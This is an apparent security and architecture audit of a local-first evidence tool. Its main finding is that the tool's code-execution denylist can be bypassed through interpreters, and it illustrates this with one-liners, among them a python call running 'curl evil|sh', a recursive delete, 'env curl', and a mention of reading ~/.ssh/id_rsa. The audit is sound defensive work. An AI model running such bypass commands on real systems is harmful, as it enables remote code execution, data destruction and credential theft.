# Truth Harness — Architecture Audit #2 (Claude)

Date: 2026-06-11
Commit audited: `74f43ca` "feat: build local-first evidence workbench foundation"
Method: read directly from git objects at HEAD (`git show HEAD:<path>`), not the working-tree mount (the mount was torn in the prior session; committed blobs verified intact — e.g. `HEAD:packages/core/src/types.ts` terminates cleanly at the `Receipt` interface).
Scope: 148 tracked files, 82 first-party `.ts`, 39 test files, 25 JSON Schemas. Pre-commit gates reported green (212 tests, `proof:launch`).
Audience: Codex, for implementation planning.

---

## TL;DR

The repo grew a lot and got more honest in the process — `proof-backend.ts` now refuses to mint `proved` without Lean accepting a concrete artifact, `workspace-validation.ts` actually consumes the JSON Schemas it ships (the dead-schema problem from audit #1 is largely fixed), and `receipt-validation.ts` gives precise JSON-path errors with fail-toward-missing behavior. Those are real improvements.

But the same commit added **live, agent-reachable code execution** (`truth_harness_code_run` over MCP) guarded by a **default-allow denylist that does not constrain interpreters** — and that single design choice makes the project's headline guarantee (local-first, `networkAccess: none`) false, and worse, *machine-attested-false*, the moment an agent uses the tool. This is the finding to fix before anything else, including before the next demo.

---

## Findings, ordered by severity

### 🔴 C1 — `truth_harness_code_run` is arbitrary code execution; its policy is bypassable by design and voids the privacy guarantee

**What the code does.** `evaluateCodeRunPolicy` (`packages/core/src/code-run.ts:592`) is a *denylist*: it blocks five hardcoded sets — shell launchers (`code-run.ts:175`: cmd, powershell, bash, sh, zsh…), network commands (`:176`: curl, wget, ssh…), destructive (`:177`: rm, format…), package mutations (`:178` + arg sniffing), git mutations (`detectGitMutation`). Everything else is allowed. The allowlist is opt-in: when `allowedExecutables` is empty, `matchedAllowlist = true` (`:725`). The tool is exposed over MCP with `readOnlyHint: false` (`packages/mcp-server/src/index.ts:802`) and over the CLI (`apps/cli/src/index.ts:732`). Execution is `spawnSync` with the **full inherited environment** (`code-run.ts:179` `inheritedEnvironment: true`).

**Why the policy is security theater.** The denylist blocks `bash` but allows every general-purpose interpreter — `python`, `python3`, `node`, `perl`, `ruby`, `make`, `awk`, `npx`, `uv`, `env`, `go` — none of which appear in any blocked set (confirmed: grep for `npx`/`env`/`make`/`node` in `code-run.ts` returns nothing). Each is a universal escape that defeats *all five* categories at once:

- `python -c "import socket; ..."` → opens a network connection. The "network-command" block is meaningless.
- `python -c "import shutil; shutil.rmtree('/...')"` → destructive. The "destructive-command" block is meaningless.
- `python -c "import os; os.system('curl evil|sh')"` → spawns a shell. The "shell-launcher" block is meaningless.
- `env curl http://x` → `env` is the executable, `curl` is just an argument; not detected. Direct bypass.
- `npx <package>` → runs arbitrary downloaded code; `npx` is not in `PACKAGE_MANAGERS` (`:178`).

There is no OS sandbox — no network namespace, no seccomp, no container, no `bwrap`. The `cwd` is jailed to the workspace (`resolveWorkspacePath`, `:735`), but that only sets the child's working directory; a spawned interpreter can read `~/.ssh/id_rsa` or write outside the workspace via absolute paths.

**Why this is critical, not just a sandbox gap.** The written record stamps `privacy: { mode: "local-only", networkAccess: "none", dataResidency: "local-workspace" }`, copied from the manifest (`local-workspace.ts:224-226`) onto every code-run record. So a run that opened a socket via `python` is *recorded as having no network access*. The product's entire thesis is "receipts you can trust about provenance and privacy." Here the receipt asserts a falsehood the system cannot back. A skeptical reviewer (or a security-minded HN reader) who runs `truth_harness_code_run python -c "import urllib.request; urllib.request.urlopen('http://...')"` and then reads the resulting `networkAccess: none` record has a one-line takedown.

**Fixes (do all four):**
1. **Default-deny.** Empty `allowedExecutables` must mean *block*, not allow (`code-run.ts:725`). No execution without an explicit, recorded allowlist.
2. **Real isolation, not name lists.** Interpreter bypass is unsolvable by enumeration. Require an OS sandbox for any code-run: network-denied namespace + filesystem scope (Linux: `bwrap`/user namespaces or a container; document macOS/Windows degraded modes). Put it behind one `runSandboxed()` utility (this is audit #1's R8, now acute).
3. **Privacy must be measured, not asserted.** Never copy the manifest's `networkAccess: none` onto an executed-command record. The field must reflect the sandbox: `none` only when a network-denied sandbox was enforced; otherwise `unknown` and `mode: "external-capable"`. (See H1.)
4. **Gate the tool.** Require an explicit opt-in (e.g. `TRUTH_HARNESS_ALLOW_CODE_RUN=1` plus a per-call allowlist) so `truth_harness_code_run` is not silently reachable by any agent that connects to the MCP server.

---

### 🟠 H1 — Privacy metadata is a hardcoded constant, and no test can falsify "local-only"

`createLocalOnlyPrivacyMetadata` and the manifest privacy block (`local-workspace.ts:224`, `receipt.ts` builders) stamp `networkAccess: none` as a literal on every artifact. It is documentation pretending to be a measurement. There is **no egress test** in the suite (grep for `Socket.connect`/`net.connect`/`egress` in `*.test.ts` returns only unrelated benchmark hits). So "local-first, private by default" is currently unfalsifiable, and C1 already contradicts it.
**Fix:** (a) Add a CI privacy gate: run the suite + `proof:launch` under a socket monkey-patch (`net.Socket.prototype.connect` throws) and assert zero connection attempts. (b) An ESLint/CI rule forbidding `node:http(s)`/`net`/`undici` imports outside a future, single network-capable package. (c) Make `PrivacyMetadata` a function of enforced conditions, not a constant.

---

### 🟠 H2 — Blocking `spawnSync` freezes the MCP server for up to 5 minutes per call

`runCommand` uses `spawnSync` (`code-run.ts:385`); the MCP schema allows `timeoutMs` up to 300000 (`index.ts:821`). `spawnSync` blocks the Node event loop, so a single in-flight code-run makes the entire MCP server unresponsive to every other agent/tool for the duration. There is no global concurrency or resource cap.
**Fix:** Replace with async `spawn` + streamed capture + timeout kill; add a per-workspace concurrency limit and an aggregate wall-clock/output budget. (The SymPy and proof/SMT backends also use `spawnSync` — acceptable for short probes, but the same pattern shouldn't carry into long-running code execution.)

---

### 🟠 H3 — Storage layer won't survive the multi-agent, write-heavy workload it now invites

Every `list*`/lookup still reads and parses every JSON in a directory (`evidence-audit.ts:188-201`, id-resolution scan `:611-622`); writes are plain `writeFile` (32 occurrences across core, **zero** temp-file+rename); there is no lock. With code-runs, benchmark records, and audits now firing in agent loops, a crash mid-write corrupts an artifact, two agents racing the corpus index or a session file lose data, and `list` cost grows linearly with history.
**Fix:** atomic write (temp + `rename`) in one shared `fs-util`; a per-workspace advisory lockfile for read-modify-write paths; an optional, rebuildable SQLite catalog (`indexes/catalog.db`) for `list`/lookup, with files staying canonical. (Audit #1 R9 — now load-bearing.)

---

### 🟠 H4 — Two contradictory `proved` paths

The new proof backend is exemplary: `proved` requires Lean to accept a concrete artifact (`proof-backend.ts:57` `provedRequiresAcceptedProofChecker`, `:71` status enum, `acceptedProofChecker: true`). But the original universal-parity path in `receipt.ts` still mints `trust: "proved"` from the homemade `proveUniversalParity` kernel — no external checker. So the system now holds a strict bar on one path and an honor-system bar on the other, for the same label. A mathematician comparing them will distrust both.
**Fix:** reconcile to one rule. Either (a) port the parity argument to Lean once and route the parity path through the real checker (best — dogfoods the product), or (b) give the kernel a distinct backend id and a weaker label (`kernel-proved`) until it's externally verified. Either way, every `proved` receipt must name its `ReceiptBackend` and whether `acceptedProofChecker` was true.

---

### 🟡 M1 — Denylist arg-detection is shallow (defense-in-depth, secondary to C1)

Even setting the interpreter bypass aside, `detectPackageMutation`/`detectGitMutation` only inspect `firstNonOptionArg` and miss `npx`, `uv`, `poetry`, `conda`, `gem`, `go install`, and option-form git mutations (`git -c ... push`). Once C1's default-deny + sandbox lands, this matters less, but the lists should be completed and treated as advisory categorization, never as the security boundary.

### 🟡 M2 — Schema validation is on-demand, not on-write/read

Real progress: `workspace-validation.ts` loads `schemas/*.json` (`:605`), validates artifacts against them with a custom validator, and checks cross-references with fail-toward-missing. But it runs only on `workspace verify` — a `write*` can still persist an invalid artifact that's caught only later. Close the loop: validate on write and (cheaply) on read at the trust-boundary readers. The pieces all exist; they're just not wired into the write path.

### 🟡 M3 — Overclaim/expert-review gating is still keyword regex

`requiresExpertReview` (`code-run.ts`, `/\b(cancer|clinical|patient|drug|...|disease)\b/`) and the evidence-audit heuristics still miss obvious terms ("tumor", "carcinoma", "eradicate", "reverses", "remission"). A purpose string of "test whether compound eradicates tumors" does not trip expert review. Same issue as audit #1 R5; reframe as a versioned, fail-closed lexical *screen* (labeled as such in the artifact), not an audit.

### 🟡 M4 — `failOnNonzero` / strict semantics need protocol tests

The MCP code-run schema exposes `failOnNonzero` (`index.ts`); ensure the in-memory server test exercises the error path and that strict modes (`truth_harness_ask` strict, proof-check rejected) return `isError` consistently. The single large server test should be split per-tool with golden `tools/list` snapshots so schema drift is reviewable.

---

## 1. Architectural risks now that the evidence layer is large

The layer is wide (≈20 record types) and the *shape* is consistent and good (content-addressed IDs, schema'd, human-readable JSON, pervasive boundary/warning text). The risks are not in the record modeling; they are in the three cross-cutting concerns that every record now depends on and none of which scales yet: **execution safety (C1/H2)**, **privacy as measurement (H1)**, and **storage durability/throughput (H3)**. Add one structural risk: `PrivacyMetadata` and `ReceiptBackend` are duplicated/derived ad hoc per module; they should be single shared types with single constructors so a fix (like H1) lands everywhere at once.

## 2. Unsafe assumptions (by subsystem)

- **code-run policy:** assumes a denylist of names can contain execution (false — C1); assumes inherited env is safe to run but safe to omit from the record (it's neither fully safe nor reproducible); assumes `cwd` jail = filesystem containment (false for absolute paths).
- **MCP tools:** assume any connected agent may execute code (no opt-in gate); assume `spawnSync` is fine in a server (H2).
- **proof checks:** sound and conservative — the one subsystem whose assumptions hold. Keep it as the template.
- **receipt validation:** sound; the remaining gap is that it's not invoked on write (M2).
- **workspace storage:** assumes single writer, no crashes, small N (H3).

## 3. Missing / weak test coverage

No egress/privacy test (H1). No sandbox-escape red-team tests for code-run (network attempt, path traversal, fork bomb, secret read — all should be *blocked and recorded*). No concurrent-write/atomicity test (H3). No cross-platform replay matrix (claimHash stability vs env drift — audit #1 R3 still open). MCP tests are one monolith, not per-tool with golden schemas (M4). Property tests for the math kernels (rational field axioms, parser round-trip, parity kernel vs brute force) still absent.

## 4. Will the abstractions scale to a real app/API/CLI for many users?

The **artifact/record abstraction will scale** — it's the right core and worth preserving. The **runtime around it will not, yet**: file-per-record + full-scan listing, non-atomic writes, no locking, blocking synchronous execution, and privacy-as-constant are all single-user/small-N assumptions. None requires a rewrite; each is a contained change (index, atomic IO, async exec, measured privacy). Do those before any hosted API, because an API multiplies concurrency and makes C1/H1 internet-facing.

## 5. What to build next for credibility (mathematicians, scientists, HN)

The credible wedge is unchanged and now closer: "AI claims a proof; this local tool refuses to say `proved` until Lean accepts it, refutes the false variant with a counterexample, and emits a receipt you can replay — no network, and we have a test that proves no network." That last clause (H1) is what converts skeptics. The Lean-backed `proved` path is genuinely impressive — lead with it. Do **not** demo `code_run` until C1 is fixed; in its current state it's the thing that gets the project dismissed.

## 6. Overclaim check

Mostly disciplined — the code-run record's own boundary text ("does not prove code correctness, scientific validity, safety, regulatory approval, or patentability", `code-run.ts:renderCodeRunMarkdown`) is exactly right, and medical/patent framing stays carefully hedged. Two concrete overclaims to fix: (a) the `networkAccess: none` / `local-only` stamp on executed runs that can reach the network (C1/H1) — this is the serious one; (b) `proved` from the unverified parity kernel (H4). Both are truth/proof-certainty overclaims the rest of the project is careful to avoid.

---

## Recommended next 5–10 implementation tasks

1. **Lock down `truth_harness_code_run` (C1).** Default-deny allowlist; opt-in env gate; reject execution when no sandbox is available or mark the record `sandbox: none` + `networkAccess: unknown`. Files: `code-run.ts` (`evaluateCodeRunPolicy`, record builder, privacy), `mcp-server/src/index.ts:802`, `apps/cli/src/index.ts:732`. Tests: default-deny, gate-off blocks, bypass corpus (`python -c socket`, `env curl`, `npx`). Accept: no code path executes a network/destructive action while recording `networkAccess: none`.
2. **Real sandbox (`runSandboxed`).** Network-denied + filesystem-scoped execution; degraded modes documented and recorded. Files: new `packages/core/src/sandbox.ts`, `code-run.ts`, `SECURITY.md`. Tests: red-team escapes blocked and recorded.
3. **Privacy as measurement + egress CI gate (H1).** Socket-deny harness over full suite; `PrivacyMetadata` derived from enforced conditions; import lint. Accept: adding egress fails CI.
4. **Async execution + resource budgets (H2).** Replace `spawnSync` in code-run with async `spawn`; per-workspace concurrency + aggregate caps. Accept: a long code-run does not block other MCP calls.
5. **Atomic writes + lock + SQLite catalog (H3).** Shared `writeFileAtomic`; advisory lock; rebuildable index used by `list*`. Accept: kill -9 mid-write never corrupts; `list` on 10⁴ records < 100ms.
6. **Reconcile `proved` (H4).** Lean-verify the parity kernel or relabel it; every `proved` names its backend + `acceptedProofChecker`. Accept: one rule for the label across all paths.
7. **Validate on write/read (M2).** Wire the existing schema validator into `write*` and trust-boundary readers. Accept: invalid artifact can't be written silently.
8. **Versioned, fail-closed overclaim screen (M3).** Expand lexical lists into data files with a recorded `screen: lexical-vN`; unclassifiable strong claims fail toward `hypothesis`. Tests: synonym/bypass corpus.
9. **Per-tool MCP protocol tests + golden `tools/list` (M4).** Split the server test; real stdio; happy/error/`isError` per tool.
10. **Math-kernel property tests.** rational axioms, parser round-trip, parity kernel vs brute force (≥10⁴ cases).

---

## What is already strong

- **Proof backend honesty (`proof-backend.ts`).** `proved` requires Lean accepting a concrete artifact; status probes explicitly state they never mint `proved`. This is the model for every other adapter.
- **Schemas are now load-bearing.** `workspace-validation.ts` loads and validates against `schemas/*.json` and checks cross-references with fail-toward-missing — the dead-schema problem from audit #1 is largely resolved.
- **Receipt validation (`receipt-validation.ts`).** Precise JSON-path errors, pattern-checked `runId`, evidence/privacy/graph validation, and fail-toward-missing at audit/discovery trust boundaries (the slice Codex described — verified correct).
- **Boundary text is built into the artifacts**, not just the docs — code-run, simulation, experiment, claim-chart all carry explicit "this does not prove…" statements and required-next-checks.
- **Default-deny *intent*** on risky command categories exists (it's just incomplete and bypassable — C1/M1 are about making the intent real, not adding it).
- **Test breadth** (212 tests / 39 files) and green `proof:launch` give a real regression floor to build on.

---

*All `file:line` references read from git objects at `74f43ca`. Where this audit repeats audit #1 (R3 replay, R5 overclaim, R8 sandbox, R9 storage), it's because those items are now load-bearing under the new execution surface — they moved from "should fix" to "fix before users." The C1 finding is new to this commit and supersedes everything else in priority.*
